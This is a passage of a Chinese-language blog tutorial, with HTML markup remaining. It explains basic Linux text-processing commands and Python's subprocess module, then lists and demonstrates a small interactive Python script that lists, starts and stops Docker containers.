class="language-bash">➜  ~ docker <span class="token function">ps</span> -a <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">""</span> <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">" "</span> <span class="token string">'{print <span class="token variable">$NF</span>}'</span> <span class="token operator">|</span> <span class="token function">grep</span> -v NAMESwordpressdb.wordpresshttpbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、Linux基本命令"><a href="#2、Linux基本命令" class="headerlink" title="2、Linux基本命令"></a>2、Linux基本命令</h3><h4 id="2-1、"><a href="#2-1、" class="headerlink" title="2.1、|"></a>2.1、|</h4><p>​        “命令格式：<strong>命令A|命令B</strong>，即命令1的正确输出作为命令B的操作对象”</p><img src="https://s1.ax1x.com/2020/04/09/Gh6vGj.png"><p>比如说：</p><pre class="line-numbers language-bash"><code class="language-bash">docker inspect container_id <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"IPAddress"</span><span class="token comment" spellcheck="true">#将前面查看container_id的具体信息作为输入条件，grep命令在输入的具体信息中寻找与"IPAddress"有关的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-2、grep"><a href="#2-2、grep" class="headerlink" title="2.2、grep"></a>2.2、grep</h4><p>​        grep命令的常用格式为：grep  [选项]  ”模式“  [文件]，在本文中用不到[选项]这个内容。这个命令的意思是在文件中寻找与模式相匹配的内容。</p><p>比如说：</p><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ <span class="token function">grep</span> <span class="token string">"IPAddress"</span> info.txt             <span class="token string">"SecondaryIPAddresses"</span><span class="token keyword">:</span> null,            <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.3"</span>,                    <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.3"</span>,<span class="token comment" spellcheck="true">#在info.txt这个文件中找到与"IPAddress"相匹配的内容并将其打印出来</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3、awk"><a href="#2-3、awk" class="headerlink" title="2.3、awk"></a>2.3、awk</h4><p>​        awk命令比较复杂，这里只说与本文有关内容。</p><p>​        这里使用例子：<code>awk -F " " '{print $NF}'</code>，将前面的输出作为输入进行处理，使用” “（空格）作为分割符，打印最后一列，其中 <code>$NF</code> 代表最后一列，<code>$1</code> 代表第一列，依次往后推</p><h4 id="2-4、sed"><a href="#2-4、sed" class="headerlink" title="2.4、sed"></a>2.4、sed</h4><p>​        sed命令比较复杂，这里只说与本文有关内容。</p><p>​        这里使用例子 <code>sed  $'s/\"//g'</code> ，这里<code>s/</code>代表搜索，<code>\</code> 表示转义，也就是说将 <code>"</code> （双引号）进行转移，然后<code>/</code>表示格式，<code>/g</code>表示全局搜索，而两个<code>/</code>中间没有内容表示空，所以整个语句的意思就是说把双引号去除。 </p><h4 id="2-5、cut"><a href="#2-5、cut" class="headerlink" title="2.5、cut"></a>2.5、cut</h4><p>​        cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p><p>​        这里使用例子：<code>cut -b 3-12"</code> ，<code>-b</code>  表示以字节为单位进行分割。输出第3个到第12个中间的内容</p><h3 id="3、Python常用库"><a href="#3、Python常用库" class="headerlink" title="3、Python常用库"></a>3、Python常用库</h3><h4 id="3-1、subprocess"><a href="#3-1、subprocess" class="headerlink" title="3.1、subprocess"></a>3.1、subprocess</h4><p>​        subprocess模块中的 <code>getoutput</code> 这个函数可以接受Linux命令执行后返回的结果。</p><p>比如说：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> subprocess<span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'cat /etc/issue'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> s<span class="token string">'Ubuntu 16.04.6 LTS \\n \\l\n'</span><span class="token comment" spellcheck="true">#这使得命令返回的结果更容易被处理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2、time"><a href="#3-2、time" class="headerlink" title="3.2、time"></a>3.2、time</h4><p>​        time模块中的<code>sleep</code>函数可以让程序等待指定的时间。</p><h2 id="二、代码清单"><a href="#二、代码清单" class="headerlink" title="二、代码清单"></a>二、代码清单</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/17 19:39</span><span class="token triple-quoted-string string">"""代码简陋，大佬勿喷"""</span><span class="token keyword">from</span> subprocess <span class="token keyword">import</span> getoutput <span class="token keyword">as</span> shell<span class="token keyword">import</span> sys<span class="token punctuation">,</span> timetotal_docker_id <span class="token operator">=</span> <span class="token string">"docker ps -a -q"</span>unalive_docker_id <span class="token operator">=</span> <span class="token string">"docker ps -a | grep Exited | awk -F ' ' '{print $1}' "</span>unalive_docker_name <span class="token operator">=</span> <span class="token string">"docker ps -a | grep Exited | awk -F ' ' '{print $NF}'"</span>alive_docker_id <span class="token operator">=</span> <span class="token string">"docker ps -q"</span>get_name_part1 <span class="token operator">=</span> <span class="token string">"docker ps -a | grep "</span>get_name_part2 <span class="token operator">=</span> <span class="token string">" | awk -F ' ' '{print $NF}' | grep -v NAMES"</span>get_ip_part1 <span class="token operator">=</span> <span class="token string">"docker inspect "</span>get_ip_part2 <span class="token operator">=</span> <span class="token string">" | grep 'IPAddress' | tail -n 1 | awk -F ':' '{print $2}' | cut -b 3-12"</span>get_port <span class="token operator">=</span> <span class="token string">" | grep HostPort | head -n 1 | awk -F ':' '{print$2}' | awk -F ' ' '{print $1}' | sed  $'s/\"//g'"</span>start_ins <span class="token operator">=</span> <span class="token string">"docker start "</span>stop_ins <span class="token operator">=</span> <span class="token string">"docker stop "</span><span class="token keyword">def</span> <span class="token function">alive_instance_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""这是当前存活的实例的个数"""</span>    alive_instances <span class="token operator">=</span> shell<span class="token punctuation">(</span>alive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> alive_instances<span class="token punctuation">,</span> len<span class="token punctuation">(</span>alive_instances<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_alive_instances_infos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""显示当前正在运行的docker实例"""</span>    containers_id<span class="token punctuation">,</span> _ <span class="token operator">=</span> alive_instance_info<span class="token punctuation">(</span><span class="token punctuation">)</span>    containers<span class="token punctuation">,</span> containers_ip<span class="token punctuation">,</span> containers_name<span class="token punctuation">,</span> containers_port<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> containers_id<span class="token punctuation">:</span>        containers_name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>get_name_part1 <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> get_name_part2<span class="token punctuation">)</span><span class="token punctuation">)</span>        containers_ip<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>get_ip_part1 <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> get_ip_part2<span class="token punctuation">)</span><span class="token punctuation">)</span>        containers_port<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>get_ip_part1 <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> get_port<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>containers_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        containers<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> containers_id<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_name<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_ip<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_port<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ins_code<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> containers<span class="token punctuation">,</span> ins_code<span class="token keyword">def</span> <span class="token function">show_alive_instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    containers<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_alive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\tNow,the instances running are list as follows: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t实例编号\t容器的ID\t\t容器的名字\t容器的IP\t容器的端口"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>containers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t%4s\t\t%s\t\t%s\t%s\t%s"</span> <span class="token operator">%</span><span class="token punctuation">(</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str<span class="token punctuation">.</span>center<span class="token punctuation">(</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str<span class="token punctuation">.</span>center<span class="token punctuation">(</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unalive_instances</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""当前没有运行的实例的ID"""</span>    unalive_instance <span class="token operator">=</span> shell<span class="token punctuation">(</span>unalive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> unalive_instance<span class="token punctuation">,</span> len<span class="token punctuation">(</span>unalive_instance<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_unalive_instances_infos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    container_id<span class="token punctuation">,</span> _ <span class="token operator">=</span> unalive_instances<span class="token punctuation">(</span><span class="token punctuation">)</span>    containers_name <span class="token operator">=</span> shell<span class="token punctuation">(</span>unalive_docker_name<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    containers_ip<span class="token punctuation">,</span> containers<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> container_id<span class="token punctuation">:</span>        containers_ip<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"未运行,无IP"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>containers_ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        containers<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> container_id<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_name<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_ip<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ins_code<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> containers<span class="token punctuation">,</span> ins_code<span class="token keyword">def</span> <span class="token function">show_unalive_instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    containers<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_unalive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\tNow,the instances not running are list as follows: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t实例编号\t容器的ID\t\t容器的名字\t\t容器的IP"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> container <span class="token keyword">in</span> containers<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> info <span class="token keyword">in</span> container<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t%4s"</span> <span class="token operator">%</span> info<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"\t "</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start_instance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    containers <span class="token operator">=</span> value    <span class="token keyword">for</span> container <span class="token keyword">in</span> containers<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            shell<span class="token punctuation">(</span>start_ins <span class="token operator">+</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start %s successful"</span> <span class="token operator">%</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开启实例的时候好像出了点问题..."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stop_instance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    containers <span class="token operator">=</span> value    <span class="token keyword">for</span> container <span class="token keyword">in</span> containers<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            shell<span class="token punctuation">(</span>stop_ins <span class="token operator">+</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stop %s successful"</span> <span class="token operator">%</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"关闭实例的时候好像出了点问题..."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">docker_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">">>"</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"Docker managemet program by valecalida"</span><span class="token punctuation">,</span> <span class="token string">"&lt;&lt;"</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t1 >> 查看当前docker的运行状态"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t2 >> 开启指定(全部)容器"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t3 >> 关闭指定(全部)容器"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tq >> 退出程序(q)"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        docker_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>        len_alive <span class="token operator">=</span> len<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>alive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        total <span class="token operator">=</span> len<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>total_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        len_unalive <span class="token operator">=</span> total <span class="token operator">-</span> len_alive        user_choice_1 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"输入您想要进行的操作的序号 >> "</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t程序将在一秒后自动退出'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> len_alive <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">and</span> len_unalive <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                show_unalive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> len_unalive <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">and</span> len_alive <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                show_alive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> len_alive <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">and</span> len_unalive <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                show_unalive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>                show_alive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> len_unalive <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t当前没有未开启的docker容器\n"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                show_unalive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>                containers<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> get_unalive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>                user_choice_2 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入您想要启动的docker实例编号(a all) >> "</span><span class="token punctuation">)</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'a'</span><span class="token punctuation">:</span>                        start_instance<span class="token punctuation">(</span>containers<span class="token punctuation">)</span>                    <span class="token keyword">elif</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t正在返回上级菜单..."</span><span class="token punctuation">)</span>                    <span class="token keyword">elif</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token keyword">in</span> ins_code<span class="token punctuation">:</span>                        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>ins_code<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">if</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token operator">==</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                                start_instance<span class="token punctuation">(</span><span class="token punctuation">[</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                                <span class="token keyword">break</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> len<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>alive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当前没有在运行的实例,无需执行关闭操作"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                show_alive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>                containers<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> get_alive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>                user_choice_2 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入您想要关闭的docker实例编号(a all) >> "</span><span class="token punctuation">)</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'a'</span><span class="token punctuation">:</span>                        stop_instance<span class="token punctuation">(</span>containers<span class="token punctuation">)</span>                    <span class="token keyword">elif</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t正在返回上级菜单..."</span><span class="token punctuation">)</span>                    <span class="token keyword">elif</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token keyword">in</span> ins_code<span class="token punctuation">:</span>                        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>ins_code<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">if</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token operator">==</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                                stop_instance<span class="token punctuation">(</span><span class="token punctuation">[</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                                <span class="token keyword">break</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t您的输入好像不太符合要求"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、执行效果"><a href="#三、执行效果" class="headerlink" title="三、执行效果"></a>三、执行效果</h2><h3 id="1、查看当前docker的运行状态"><a href="#1、查看当前docker的运行状态" class="headerlink" title="1、查看当前docker的运行状态"></a>1、查看当前docker的运行状态</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span> Docker managemet program by valecalida <span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;</span>                1 <span class="token operator">>></span> 查看当前docker的运行状态                2 <span class="token operator">>></span> 开启指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                3 <span class="token operator">>></span> 关闭指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                q <span class="token operator">>></span> 退出程序<span class="token punctuation">(</span>q<span class="token punctuation">)</span>输入您想要进行的操作的序号 <span class="token operator">>></span> 1        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            7ffb7ab9357b            ctfd_ctfd_1             未运行,无IP                   2            5647bf40afb6            ctfd_cache_1            未运行,无IP                   3            9850433d5ea5            ctfd_db_1               未运行,无IP        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、开启指定容器"><a href="#2、开启指定容器" class="headerlink" title="2、开启指定容器"></a>2、开启指定容器</h3><pre class="line-numbers language-bash"><code 